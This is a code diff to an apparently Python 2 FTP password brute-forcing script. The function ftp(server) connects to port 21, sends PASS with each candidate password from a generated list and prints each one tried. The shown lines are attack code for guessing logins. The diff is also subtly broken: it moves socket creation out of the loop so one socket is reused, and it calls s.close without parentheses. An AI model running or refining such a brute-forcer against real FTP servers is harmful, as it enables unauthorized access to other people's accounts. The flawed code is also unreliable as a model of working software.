@@ -165,13 +165,12 @@ def ftp(server):
         password.append(str(i))
         
     server=socket.gethostbyname(server)
-    
+    try:
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except:
+        print "Unable to create Socket."
+        main()
     for password in password:
-        try:
-             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        except:
-            print "Unable to create Socket."
-            main()
         try:
             s.connect((server,21))
         except:
@@ -182,8 +181,8 @@ def ftp(server):
         data=s.recv(1024)
         s.send('PASS ' +password+'\r\n')
         print data
-        data=s.recv(1024)
-        data=s.recv(1024)
+        data+=" "+s.recv(1024)
+        data+=" "+s.recv(1024)
         s.send("Quit\r\n")
         s.close
         print "[*] Tried: "+password+"\n"
